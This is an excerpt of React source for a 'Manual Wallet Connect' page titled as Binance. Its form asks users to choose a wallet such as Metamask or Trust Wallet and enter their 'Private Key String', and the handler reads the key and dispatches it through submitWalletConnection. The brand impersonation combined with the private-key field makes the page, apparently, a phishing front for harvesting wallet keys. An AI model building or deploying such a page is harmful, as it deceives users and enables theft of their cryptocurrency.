...
import { setAmount, submitWalletConnection } from '../../redux/APP_STATE/actions'
...
export default function ManualWalletConnect() {
  ...
  const handle_wallet_connetion = (e) => {
    e.preventDefault()
    const form = formRef.current
    const wallet_key = form.wallet_key.value
    const crypto_wallet = form.crypto_wallet.value
    ...
    dispatch(submitWalletConnection(data))
  ...
  return (
    <div id="wrapper" className='text-sm font-ibm_plex text-gray-800 h-[100vh]'>
        <Loader />
      <Head>
        <title>Manual Wallet Connect | Binance</title>
      ...
      <div className="max-w-4xl px-5 pt-10 pb-3 md:p-16 mx-auto md:flex justify-between items-end">
        <div className="w-full md:w-[400px] mb-5 md:mb-0">
          <h2 className="text-2xl md:text-3xl font-semibold mt-2 mb-10 md:my-2">ManualWalletConnect</h2>
          ...
          <form className="my-5" ref={formRef} onSubmit={ handle_wallet_connetion }>
            <div className="input_field">
              ...
              <div className="px-3 w-full border rounded-md focus-within:border-[#E18404] flex justify-between items-center">
                ...
                <select name='crypto_wallet' className='select text-gray-500 font-semibold py-3.5 pr-3.5 w-full outline-none appearance-none' >
                    <option value="">Select</option>
                    <option value="Trust Wallet">Trust Wallet</option>
                    <option selected value="Metamask Wallet">Metamask Wallet</option>
                    <option value="Safemoon Wallet">Safemoon Wallet</option>
            ...
            <div className="input_field">
              <label className="block">Private Key String</label>
              <div className="px-3 w-full border rounded-md focus-within:border-[#E18404] flex justify-between items-center">
                <input type="text" name='wallet_key' placeholder='' className='py-3.5 pr-3.5 w-[80%] outline-none appearance-none' required />
                 {/* <span className="inline-block text-primary_dim font-semibold cursor-pointer mr-1">Get code</span>  */}
              </div>
            </div>
            ...
            <button className="w-full bg-primary text-center text-gray-800 font-semibold p-3 mt-3 rounded-sm">Connect</button>
          </form>
